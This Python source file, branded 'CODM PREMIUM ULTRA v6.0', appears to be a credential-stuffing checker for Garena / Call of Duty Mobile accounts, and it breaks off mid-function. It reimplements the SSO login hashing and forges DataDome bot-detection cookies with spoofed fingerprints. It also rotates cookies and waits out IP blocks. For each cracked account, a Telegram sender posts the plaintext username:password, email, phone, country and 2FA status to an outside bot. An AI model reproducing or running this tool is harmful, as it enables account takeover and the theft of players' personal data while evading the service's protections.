import sys
import time
import os
import re
import math
import random
import signal
import requests
import json
import base64
import hashlib
import urllib.parse
import uuid
import threading
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from collections import defaultdict
from Crypto.Cipher import AES
import cloudscraper
from colorama import init, Fore, Style
init(autoreset=True)

from rich.console import Console
from rich.console import Group
from rich.panel import Panel
from rich.table import Table
from rich import box
from rich.prompt import Prompt

shutdown_event = threading.Event()
console = Console()
FILE_LOCK = Lock()
PRINT_LOCK = Lock()
TG_SETTINGS = None

def signal_handler(sig, frame):
    shutdown_event.set()
    console.print("\n[bold red]⚠️ Ctrl+C detected - Shutting down...[/]")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def format_size(size_bytes):
    if size_bytes == 0: return "0B"
    size_name = ("B", "KB", "MB", "GB", "TB")
    i = int(math.floor(math.log(size_bytes, 1024)))
    p = math.pow(1024, i)
    s = round(size_bytes / p, 2)
    return f"{s}{size_name[i]}"

def add_indent(text, spaces=8):
    prefix = " " * spaces
    return "\n".join(prefix + line for line in text.split("\n"))

def get_country_emoji(country_code):
    emojis = {
        'PH': '🇵🇭', 'ID': '🇮🇩', 'TH': '🇹🇭', 'VN': '🇻🇳', 'MY': '🇲🇾', 'SG': '🇸🇬',
        'MM': '🇲🇲', 'LA': '🇱🇦', 'KH': '🇰🇭', 'BN': '🇧🇳', 'TL': '🇹🇱',
        'CN': '🇨🇳', 'TW': '🇹🇼', 'HK': '🇭🇰', 'MO': '🇲🇴', 'JP': '🇯🇵', 'KR': '🇰🇷',
        'KP': '🇰🇵', 'MN': '🇲🇳',
        'IN': '🇮🇳', 'PK': '🇵🇰', 'BD': '🇧🇩', 'NP': '🇳🇵', 'LK': '🇱🇰', 'BT': '🇧🇹',
        'MV': '🇲🇻', 'AF': '🇦🇫',
        'US': '🇺🇸', 'CA': '🇨🇦', 'MX': '🇲🇽', 'BR': '🇧🇷', 'AR': '🇦🇷', 'CL': '🇨🇱',
        'CO': '🇨🇴', 'PE': '🇵🇪', 'VE': '🇻🇪', 'EC': '🇪🇨', 'UY': '🇺🇾', 'PY': '🇵🇾',
        'BO': '🇧🇴', 'GT': '🇬🇹', 'HN': '🇭🇳', 'NI': '🇳🇮', 'CR': '🇨🇷', 'PA': '🇵🇦',
        'CU': '🇨🇺', 'DO': '🇩🇴', 'PR': '🇵🇷',
        'GB': '🇬🇧', 'DE': '🇩🇪', 'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'PT': '🇵🇹',
        'NL': '🇳🇱', 'BE': '🇧🇪', 'CH': '🇨🇭', 'AT': '🇦🇹', 'SE': '🇸🇪', 'NO': '🇳🇴',
        'DK': '🇩🇰', 'FI': '🇫🇮', 'PL': '🇵🇱', 'CZ': '🇨🇿', 'HU': '🇭🇺', 'GR': '🇬🇷',
        'RU': '🇷🇺', 'UA': '🇺🇦', 'IE': '🇮🇪',
        'AE': '🇦🇪', 'SA': '🇸🇦', 'QA': '🇶🇦', 'KW': '🇰🇼', 'OM': '🇴🇲', 'BH': '🇧🇭',
        'IL': '🇮🇱', 'TR': '🇹🇷', 'IR': '🇮🇷',
        'ZA': '🇿🇦', 'EG': '🇪🇬', 'NG': '🇳🇬', 'KE': '🇰🇪', 'MA': '🇲🇦',
        'AU': '🇦🇺', 'NZ': '🇳🇿', 'PG': '🇵🇬',
        'UNKNOWN': '🌍'
    }
    return emojis.get(country_code.upper(), '🌍')

class LoadingAnimation:
    def __init__(self):
        self.spinner_frames = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
    def elite_sequence(self):
        console.print(Panel("[bold cyan]⚡ SYSTEM BOOT ⚡[/bold cyan]", border_style="bright_magenta", box=box.DOUBLE))
        for i in range(20):
            if shutdown_event.is_set():
                break
            frame = self.spinner_frames[i % len(self.spinner_frames)]
            console.print(f"[cyan]{frame} Loading Modules...[/]", end='\r')
            time.sleep(0.1)
        console.print(Panel("[bold green]✔ SYSTEM READY - PREMIUM ACCESS GRANTED[/bold green]", border_style="bright_green", box=box.DOUBLE))

def display_banner():
    clear_screen()
    banner = r"""
 ██████╗  ██████╗ ██████╗ ███╗   ███╗
██╔════╝ ██╔═══██╗██╔══██╗████╗ ████║
██║      ██║   ██║██║  ██║██╔████╔██║
██║      ██║   ██║██║  ██║██║╚██╔╝██║
╚██████╗ ╚██████╔╝██████╔╝██║ ╚═╝ ██║
 ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝     ╚═╝
"""
    colors = ["bright_cyan", "bright_green", "bright_magenta", "bright_yellow"]
    color = random.choice(colors)
    console.print(f"[{color}]{banner}[/{color}]")
    premium_tag = r"""
╔══════════════════════════════════════════════════════════╗
║ ██████╗ ██████╗ ███████╗███╗   ███╗██╗██╗   ██╗███╗   ███╗║
║ ██╔══██╗██╔══██╗██╔════╝████╗ ████║██║██║   ██║████╗ ████║║
║ ██████╔╝██████╔╝█████╗  ██╔████╔██║██║██║   ██║██╔████╔██║║
║ ██╔═══╝ ██╔══██╗██╔══╝  ██║╚██╔╝██║██║██║   ██║██║╚██╔╝██║║
║ ██║     ██║  ██║███████╗██║ ╚═╝ ██║██║╚██████╔╝██║ ╚═╝ ██║║
║ ╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝ ╚═════╝ ╚═╝     ╚═╝║
╚══════════════════════════════════════════════════════════╝
"""
    console.print(f"[bright_yellow]{premium_tag}[/bright_yellow]")
    welcome_msg = """
╔═══════════════════════════════════════════════════════════╗
║                  WELCOME TO CODM PREMIUM                  ║
║                     ULTRA EDITION                         ║
║                【🄿🅁🄴🄼🄸🅄🄼 🅅🄴🅁🅂🄸🄾🄽 6.0】            ║
╚═══════════════════════════════════════════════════════════╝
"""
    console.print(f"[bright_cyan]{welcome_msg}[/bright_cyan]")
    features_table = Table(box=box.DOUBLE_EDGE, show_header=False, padding=(0, 2), width=70)
    features_table.add_column(style="green", width=3)
    features_table.add_column(style="white")
    feature_list = [
        ("✓", "Auto Cookie & DataDome Rotation"),
        ("✓", "Smart IP & 403 Handling"),
        ("✓", "Clean / Not Clean Filter"),
        ("✓", "Real-time Progress"),
        ("✓", "Auto Duplicate Removal"),
        ("✓", "Organized Results"),
        ("✓", "Single-Threaded (Stable)"),
        ("✓", "Auto-Retry on Errors"),
        ("✓", "Result Deduplication"),
        ("✓", "Auto IP Change Detection"),
        ("✓", "IP Block Protection"),
        ("✓", "Telegram Hit Sender"),
    ]
    for icon, text in feature_list:
        features_table.add_row(icon, text)
    console.print(Panel(features_table, title="[bold bright_green]✨ PREMIUM FEATURES[/bold bright_green]", border_style="bright_green", padding=(1, 2)))
    system_info = Panel(
        f"[bold cyan]SYSTEM INFORMATION[/bold cyan]\n\n"
        f"[white]SYSTEM STATUS:[/white] [green]READY[/green]\n"
        f"[white]VERSION:[/white] [yellow]Premium v6.0[/yellow]\n"
        f"[white]CREATOR:[/white] [magenta]@rrielqt[/magenta]\n"
        f"[white]DATE:[/white] [cyan]{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}[/cyan]\n",
        border_style="bright_blue",
        box=box.DOUBLE_EDGE,
        width=70
    )
    console.print(system_info)
    creator_box = """
╔═══════════════════════════════════════════════════════════╗
║  CREATED BY: [bold bright_cyan]@rrielqt[/bold bright_cyan]                           ║
║  VERSION: [bold yellow]ULTRA v6.0[/bold yellow]                                   ║
║  STATUS: [bold green]● ACTIVE[/bold green]                                      ║
╚═══════════════════════════════════════════════════════════╝
"""
    console.print(f"\n[bright_magenta]{creator_box}[/bright_magenta]")
    anim = LoadingAnimation()
    anim.elite_sequence()
    time.sleep(1)

def rich_confirm(prompt_text):
    panel = Panel(
        f"[bold cyan]{prompt_text}[/]\n\n"
        "[bold yellow]1.[/] [green]Yes[/]\n"
        "[bold yellow]2.[/] [red]No[/]",
        title="[bold]❓ Question[/]",
        border_style="bright_blue",
        box=box.ROUNDED
    )
    console.print(panel)
    while True:
        choice = Prompt.ask("[bold yellow]Enter your choice[/bold yellow]", choices=["1", "2"])
        return True if choice == "1" else False

def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def applyck(session, cookie_str):
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(";"):
        item = item.strip()
        if '=' in item:
            try:
                key, value = item.split("=", 1)
                if key.strip() and value.strip():
                    cookie_dict[key.strip()] = value.strip()
            except:
                pass
    if cookie_dict:
        session.cookies.update(cookie_dict)

def get_datadome_cookie(session=None):
    fresh_session = cloudscraper.create_scraper()
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    }
    payload = {
        "jsData": json.dumps({"ttst": 76.70000004768372, "ifov": False, "hc": 4, "br_oh": 824, "br_ow": 1536, "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36", "wbd": False, "dp0": True, "tagpu": 5.738121195951787, "wdif": False, "wdifrm": False, "npmtm": False, "br_h": 738, "br_w": 260, "isf": False, "nddc": 1, "rs_h": 864, "rs_w": 1536, "rs_cd": 24, "phe": False, "nm": False, "jsf": False, "lg": "en-US", "pr": 1.25, "ars_h": 824, "ars_w": 1536, "tz": -480, "str_ss": True, "str_ls": True, "str_idb": True, "str_odb": False, "plgod": False, "plg": 5, "plgne": True, "plgre": True, "plgof": False, "plggt": False, "pltod": False, "hcovdr": False, "hcovdr2": False, "plovdr": False, "plovdr2": False, "ftsovdr": False, "ftsovdr2": False, "lb": False, "eva": 33, "lo": False, "ts_mtp": 0, "ts_tec": False, "ts_tsa": False, "vnd": "Google Inc.", "bid": "NA", "mmt": "application/pdf,text/pdf", "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF", "hdn": False, "awe": False, "geb": False, "dat": False, "med": "defined", "aco": "probably", "acots": False, "acmp": "probably", "acmpts": True, "acw": "probably", "acwts": False, "acma": "maybe", "acmats": False, "acaa": "probably", "acaats": True, "ac3": "", "ac3ts": False, "acf": "probably", "acfts": False, "acmp4": "maybe", "acmp4ts": False, "acmp3": "probably", "acmp3ts": False, "acwm": "maybe", "acwmts": False, "ocpt": False, "vco": "", "vcots": False, "vch": "probably", "vchts": True, "vcw": "probably", "vcwts": True, "vc3": "maybe", "vc3ts": False, "vcmp": "", "vcmpts": False, "vcq": "maybe", "vcqts": False, "vc1": "probably", "vc1ts": True, "dvm": 8, "sqt": False, "so": "landscape-primary", "bda": False, "wdw": True, "prm": True, "tzp": True, "cvs": True, "usb": True, "cap": True, "tbf": False, "lgs": True, "tpd": True}),
        'eventCounters': '[]', 'jsType': 'ch', 'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
        'ddk': 'AE3F04AD3F0D3A462481A337485081', 'Referer': 'https://account.garena.com/', 'request': '/', 'responsePage': 'origin', 'ddv': '4.35.4'
    }
    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())

    time.sleep(2)

    for attempt in range(3):
        try:
            response = fresh_session.post(url, headers=headers, data=data, timeout=20)
            if response.status_code == 200:
                resp_json = response.json()
                if resp_json.get('status') == 200 and 'cookie' in resp_json:
                    cookie_str = resp_json['cookie']
                    datadome = cookie_str.split(';')[0].split('=')[1]
                    return datadome
        except Exception as e:
            if attempt == 2:
                console.print(f"[red]DNS/Network error: {e}[/red]")
            time.sleep(2)
    return None

class CookieManager:
    def __init__(self):
        self.banned_cookies = set()
        self.load_banned_cookies()
    def load_banned_cookies(self):
        if os.path.exists('banned_cookies.txt'):
            with open('banned_cookies.txt', 'r') as f:
                self.banned_cookies = set(line.strip() for line in f if line.strip())
    def is_banned(self, cookie):
        return cookie in self.banned_cookies
    def mark_banned(self, cookie):
        self.banned_cookies.add(cookie)
        with open('banned_cookies.txt', 'a') as f:
            f.write(cookie + '\n')
    def get_valid_cookies(self):
        valid_cookies = []
        if os.path.exists('fresh_cookie.txt'):
            with open('fresh_cookie.txt', 'r') as f:
                valid_cookies = [c.strip() for c in f.read().splitlines() if c.strip() and not self.is_banned(c.strip())]
        random.shuffle(valid_cookies)
        return valid_cookies
    def save_cookie(self, datadome_value):
        formatted_cookie = f"datadome={datadome_value.strip()}"
        if not self.is_banned(formatted_cookie):
            existing_cookies = set()
            if os.path.exists('fresh_cookie.txt'):
                with open('fresh_cookie.txt', 'r') as f:
                    existing_cookies = set(line.strip() for line in f if line.strip())
            if formatted_cookie not in existing_cookies:
                with open('fresh_cookie.txt', 'a') as f:
                    f.write(formatted_cookie + '\n')
                return True
            return False
        return False

class DataDomeManager:
    def __init__(self):
        self.current_datadome = None
        self.datadome_history = []
        self._403_attempts = 0
    def set_datadome(self, datadome_cookie):
        if datadome_cookie and datadome_cookie != self.current_datadome:
            self.current_datadome = datadome_cookie
            self.datadome_history.append(datadome_cookie)
            if len(self.datadome_history) > 10:
                self.datadome_history.pop(0)
    def get_datadome(self):
        return self.current_datadome
    def extract_datadome_from_session(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            datadome_cookie = cookies_dict.get('datadome')
            if datadome_cookie:
                self.set_datadome(datadome_cookie)
                return datadome_cookie
            return None
        except:
            return None
    def clear_session_datadome(self, session):
        try:
            if 'datadome' in session.cookies:
                del session.cookies['datadome']
        except:
            pass
    def set_session_datadome(self, session, datadome_cookie=None):
        try:
            self.clear_session_datadome(session)
            cookie_to_use = datadome_cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                return True
            return False
        except:
            return False
    def get_current_ip(self):
        ip_services = ['https://api.ipify.org', 'https://icanhazip.com', 'https://ident.me', 'https://checkip.amazonaws.com']
        for service in ip_services:
            try:
                response = requests.get(service, timeout=10)
                if response.status_code == 200:
                    ip = response.text.strip()
                    if ip and '.' in ip:
                        return ip
            except:
                continue
        return None
    def wait_for_ip_change(self, session, check_interval=5, max_wait_time=180, ui_log=None):
        original_ip = self.get_current_ip()
        if not original_ip:
            if ui_log: ui_log(f"[WARNING] Could not determine current IP, waiting 10 seconds", "yellow")
            time.sleep(10)
            return True
        if ui_log: ui_log(f"[!] Current IP: {original_ip}", "cyan")
        if ui_log: ui_log(f"[!] Waiting for IP to change (check every {check_interval}s, {max_wait_time//60} min limit)", "yellow")
        start_time = time.time()
        attempts = 0
        while time.time() - start_time < max_wait_time:
            attempts += 1
            current_ip = self.get_current_ip()
            if current_ip and current_ip != original_ip:
                if ui_log: ui_log(f"[✓] IP changed from {original_ip} to {current_ip}", "green")
                if ui_log: ui_log(f"[✓] IP change successful after {attempts} checks", "green")
                return True
            else:
                if attempts % 3 == 0 and ui_log:
                    ui_log(f"[~] IP check {attempts}: still {current_ip or original_ip} retrying...", "yellow")
                time.sleep(check_interval)
        if ui_log: ui_log(f"[✗] IP did not change after {max_wait_time} seconds", "red")
        return False
    def handle_403(self, session, ui_log=None, cookie_manager=None):
        self._403_attempts += 1
        if self._403_attempts >= 3:
            if ui_log: ui_log(f"[!] IP blocked after 3 attempts", "red")
            if ui_log: ui_log(f"[!] Network fix: WiFi use VPN | Mobile data toggle airplane mode.", "yellow")
            if ui_log: ui_log(f"[!] Auto detecting IP changes...", "cyan")
            if self.wait_for_ip_change(session, ui_log=ui_log):
                if ui_log: ui_log(f"[✓] IP changed. Getting new DataDome cookie...", "green")
                self._403_attempts = 0
                new_datadome = get_datadome_cookie(session)
                if new_datadome:
                    self.set_datadome(new_datadome)
                    if ui_log: ui_log(f"[✓] New DataDome cookie obtained", "green")
                    return True
                else:
                    if cookie_manager:
                        if ui_log: ui_log(f"[!] Could not fetch fresh cookie, rotating to another from pool...", "yellow")
                        cookies = cookie_manager.get_valid_cookies()
                        if cookies:
                            random.shuffle(cookies)
                            new_cookie = cookies[0]
                            applyck(session, new_cookie)
                            datadome_val = new_cookie.split('=', 1)[1] if '=' in new_cookie else None
                            if datadome_val:
                                self.set_datadome(datadome_val)
                                if ui_log: ui_log(f"[✓] Switched to another cookie from pool", "green")
                                return True
                    if ui_log: ui_log(f"[✗] No working cookie available after IP change", "red")
                    return False
            else:
                if ui_log: ui_log(f"[✗] IP did not change, cannot continue", "red")
                return False
        return False

class LiveStats:
    def __init__(self):
        self.valid_count = 0
        self.invalid_count = 0
        self.clean_count = 0
        self.not_clean_count = 0
        self.has_codm_count = 0
        self.no_codm_count = 0
        self.checked_count = 0
        self.total_count = 0
        self.highest_shells = 0
        self.highest_level = 0
        self.highest_clean = 0
        self.highest_not_clean = 0
        self.start_time = time.time()
        self.lock = threading.Lock()
        self.categorized_levels = {"1-49": 0, "50-99": 0, "100-199": 0, "200-299": 0, "300-400": 0}
        self.countries = []
        self.valid_hits = []
        self.top_accounts = []
        self.two_step_count = 0
        self.auth_app_count = 0
        self.email_ver_count = 0
        self.suspicious_count = 0
    def add_hit(self, level, text):
        with self.lock:
            self.valid_hits.append({'level': level, 'text': text})
    def update_highest(self, shells, level, is_clean=None):
        with self.lock:
            try:
                s = int(float(str(shells).strip()))
                if s > self.highest_shells: self.highest_shells = s
            except: pass
            try:
                l = int(float(str(level).strip()))
                if l > self.highest_level: self.highest_level = l
                if is_clean is True and l > self.highest_clean: self.highest_clean = l
                if is_clean is False and l > self.highest_not_clean: self.highest_not_clean = l
            except: pass
    def add_codm_details(self, level, country):
        with self.lock:
            if country and country != 'N/A':
                self.countries.append(country)
            try:
                lvl = int(level)
                if 1 <= lvl <= 49: self.categorized_levels["1-49"] += 1
                elif 50 <= lvl <= 99: self.categorized_levels["50-99"] += 1
                elif 100 <= lvl <= 199: self.categorized_levels["100-199"] += 1
                elif 200 <= lvl <= 299: self.categorized_levels["200-299"] += 1
                elif 300 <= lvl <= 400: self.categorized_levels["300-400"] += 1
            except: pass
    def update_stats(self, valid=False, clean=False, has_codm=False, details=None):
        with self.lock:
            self.checked_count += 1
            if valid:
                self.valid_count += 1
                if clean:
                    self.clean_count += 1
                else:
                    self.not_clean_count += 1
                if has_codm:
                    self.has_codm_count += 1
                else:
                    self.no_codm_count += 1
                if details:
                    if details.get('security', {}).get('two_step_verify'):
                        self.two_step_count += 1
                    if details.get('security', {}).get('authenticator_app'):
                        self.auth_app_count += 1
                    if details.get('email_verified'):
                        self.email_ver_count += 1
                    if details.get('security', {}).get('suspicious'):
                        self.suspicious_count += 1
            else:
                self.invalid_count += 1
    def set_total(self, total):
        self.total_count = total
    def get_stats(self):
        with self.lock:
            elapsed = time.time() - self.start_time
            if self.checked_count > 0:
                avg_time = elapsed / self.checked_count
                remaining = avg_time * (self.total_count - self.checked_count) if self.total_count > self.checked_count else 0
                eta_seconds = remaining
            else:
                remaining = 0
                eta_seconds = 0
            return {
                'valid': self.valid_count, 'invalid': self.invalid_count, 'clean': self.clean_count,
                'not_clean': self.not_clean_count, 'has_codm': self.has_codm_count, 'no_codm': self.no_codm_count,
                'checked': self.checked_count, 'total': self.total_count, 'remaining': remaining,
                'elapsed': elapsed, 'progress': (self.checked_count / self.total_count * 100) if self.total_count > 0 else 0,
                'high_shell': self.highest_shells, 'high_lvl': self.highest_level, 'high_clean': self.highest_clean,
                'top_accounts': self.top_accounts, 'eta_seconds': eta_seconds,
                'two_step_count': self.two_step_count, 'auth_app_count': self.auth_app_count,
                'email_ver_count': self.email_ver_count, 'suspicious_count': self.suspicious_count
            }

def send_telegram_hit(bot_token, chat_id, account, password, details, codm_info, is_clean):
    try:
        username = details.get('username', account)
        email = details.get('email', 'N/A')
        email_ver = "Yes" if details.get('email_verified') else "No"
        mobile = details.get('personal', {}).get('mobile_no', 'N/A')
        mobile_display = mobile if mobile and str(mobile).strip() else "None"
        shell = details.get('profile', {}).get('shell_balance', 0)
        two_step = "Yes" if details.get('security', {}).get('two_step_verify') else "No"
        auth_app = "Yes" if details.get('security', {}).get('authenticator_app') else "No"
        country = details.get('personal', {}).get('country', 'N/A')
        suspicious = "Yes" if details.get('security', {}).get('suspicious') else "No"
        fb_link = details['facebook'].get('fb_link', 'N/A') if details.get('facebook') else 'N/A'
        id_card = details.get('personal', {}).get('id_card', 'N/A')
        id_card_str = "Yes" if id_card and id_card != 'N/A' and id_card.strip() else "No"
        codm_nickname = codm_info.get('codm_nickname', 'N/A') if codm_info else 'N/A'
        codm_uid = codm_info.get('uid', 'N/A') if codm_info else 'N/A'
        codm_level = codm_info.get('codm_level', 'N/A') if codm_info else 'N/A'
        codm_region = codm_info.get('region', 'N/A') if codm_info else 'N/A'
        last_login = details.get('last_login', 'Unknown')
        active_status = "UNKNOWN"
        if last_login != 'Unknown':
            try:
                ll_str = last_login.replace(' UTC', '')
                ll_date = datetime.strptime(ll_str, '%Y-%m-%d %H:%M:%S')
                days_ago = (datetime.now(timezone.utc) - ll_date).days
                active_status = "ACTIVE" if days_ago <= 3 else "INACTIVE"
            except: pass
        message = f"""╔══════════════════════════════════════╗
║      🎮 *CODM HIT DETECTED*          ║
╚══════════════════════════════════════╝

👤 *NICKNAME* : `{codm_nickname}`
📈 *LEVEL*    : `{codm_level}` 🔥
🌏 *REGION*   : `{codm_region}` {get_country_emoji(codm_region)}
🆔 *UID*      : `{codm_uid}`

🔐 *ACCOUNT*  : `{username}:{password}`
📧 *EMAIL*    : `{email}`
📱 *PHONE*    : `{mobile_display}`
🆔 *ID CARD*  : `{id_card_str}`
📍 *COUNTRY*  : `{country}`
🧹 *BIND*     : `{'CLEAN' if is_clean else 'NOT CLEAN'}`
💰 *SHELLS*   : `{shell}`
🛡️ *SECURITY* : `{two_step} | {auth_app} | {'Suspicious' if suspicious == 'Yes' else 'Normal'}`

────────────────────────────────────────
✨ *Status* : `{active_status}`
────────────────────────────────────────

🔗 [View Profile](https://account.garena.com/)"""
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "Markdown",
            "disable_web_page_preview": True
        }
        requests.post(url, data=data, timeout=10)
    except Exception as e:
        pass

def prelogin(session, account, datadome_manager, retries_total=3, ui_log=None, cookie_manager=None):
    url = 'https://sso.garena.com/api/prelogin'
    try:
        account.encode('latin-1')
    except UnicodeEncodeError:
        return None, None, None
    params = {'app_id': '10100', 'account': account, 'format': 'json', 'id': str(int(time.time() * 1000))}
    for attempt in range(retries_total):
        try:
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            headers = {
                'accept': 'application/json, text/plain, */*', 'accept-encoding': 'gzip, deflate, br, zstd',
                'accept-language': 'en-US,en;q=0.9', 'connection': 'keep-alive', 'host': 'sso.garena.com',
                'referer': f'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account={account}',
                'sec-ch-ua': '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
                'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
            }
            if cookie_header: headers['cookie'] = cookie_header
            if ui_log: ui_log(f"[Login attempt {attempt + 1}/{retries_total}]", "yellow")
            response = session.get(url, headers=headers, params=params, timeout=30)
            new_cookies = {}
            if 'set-cookie' in response.headers:
                set_cookie_header = response.headers['set-cookie']
                for cookie_str in set_cookie_header.split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value: new_cookies[cookie_name] = cookie_value
                        except: pass
            try:
                response_cookies = response.cookies.get_dict()
                for cookie_name, cookie_value in response_cookies.items():
                    if cookie_name not in new_cookies: new_cookies[cookie_name] = cookie_value
            except: pass
            for cookie_name, cookie_value in new_cookies.items():
                if cookie_name in ['datadome', 'apple_state_key', 'sso_key']:
                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
                    if cookie_name == 'datadome': datadome_manager.set_datadome(cookie_value)
            new_datadome = new_cookies.get('datadome')
            if response.status_code == 403:
                if new_cookies and attempt < retries_total - 1:
                    time.sleep(3)
                    continue
                if datadome_manager.handle_403(session, ui_log=ui_log, cookie_manager=cookie_manager):
                    return "IP_BLOCKED", None, None
                else:
                    return None, None, new_datadome
            response.raise_for_status()
            try: data = response.json()
            except json.JSONDecodeError:
                if attempt < retries_total - 1: time.sleep(0.1); continue
                return None, None, new_datadome
            if 'error' in data:
                return None, None, new_datadome
            v1, v2 = data.get('v1'), data.get('v2')
            if not v1 or not v2:
                return None, None, new_datadome
            if ui_log: ui_log(f"[✿︎] Pre‑login successful", "green")
            return v1, v2, new_datadome
        except requests.exceptions.HTTPError as e:
            if hasattr(e, 'response') and e.response is not None:
                if e.response.status_code == 403:
                    new_cookies = {}
                    if 'set-cookie' in e.response.headers:
                        set_cookie_header = e.response.headers['set-cookie']
                        for cookie_str in set_cookie_header.split(','):
                            if '=' in cookie_str:
                                try:
                                    cookie_name = cookie_str.split('=')[0].strip()
                                    cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                                    if cookie_name and cookie_value:
                                        new_cookies[cookie_name] = cookie_value
                                        session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
                                        if cookie_name == 'datadome': datadome_manager.set_datadome(cookie_value)
                                except: pass
                    if new_cookies and attempt < retries_total - 1:
                        time.sleep(2)
                        continue
                    if datadome_manager.handle_403(session, ui_log=ui_log, cookie_manager=cookie_manager):
                        return "IP_BLOCKED", None, None
                    else:
                        return None, None, new_cookies.get('datadome')
            if attempt < retries_total - 1: time.sleep(1); continue
        except Exception as e:
            if attempt < retries_total - 1: time.sleep(1)
    return None, None, None

def login(session, account, password, v1, v2, ui_log=None):
    hashed_password = hash_password(password, v1, v2)
    url = 'https://sso.garena.com/api/login'
    params = {'app_id': '10100', 'account': account, 'password': hashed_password, 'redirect_uri': 'https://account.garena.com/', 'format': 'json', 'id': str(int(time.time() * 1000))}
    current_cookies = session.cookies.get_dict()
    cookie_parts = []
    for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
        if cookie_name in current_cookies: cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
    cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
    headers = {
        'accept': 'application/json, text/plain, */*', 'referer': 'https://account.garena.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
    }
    if cookie_header: headers['cookie'] = cookie_header
    retries = 3
    for attempt in range(retries):
        try:
            response = session.get(url, headers=headers, params=params, timeout=30)
            response.raise_for_status()
            login_cookies = {}
            if 'set-cookie' in response.headers:
                set_cookie_header = response.headers['set-cookie']
                for cookie_str in set_cookie_header.split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value: login_cookies[cookie_name] = cookie_value
                        except: pass
            try:
                response_cookies = response.cookies.get_dict()
                for cookie_name, cookie_value in response_cookies.items():
                    if cookie_name not in login_cookies: login_cookies[cookie_name] = cookie_value
            except: pass
            for cookie_name, cookie_value in login_cookies.items():
                if cookie_name in ['sso_key', 'apple_state_key', 'datadome']:
                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
            try: data = response.json()
            except json.JSONDecodeError:
                if attempt < retries - 1: time.sleep(0.1); continue
                return None
            sso_key = login_cookies.get('sso_key') or response.cookies.get('sso_key')
            if 'error' in data:
                error_msg = data['error']
                if ui_log: ui_log(f"[!] SERVER REJECTION: {error_msg}", "yellow")
                if error_msg == 'ACCOUNT DOESNT EXIST': return None
                elif 'captcha' in error_msg.lower():
                    time.sleep(0.1)
                    continue
            return sso_key
        except requests.RequestException as e:
            if attempt < retries - 1: time.sleep(0.1)
    return None

def get_codm_access_token(session):
    try:
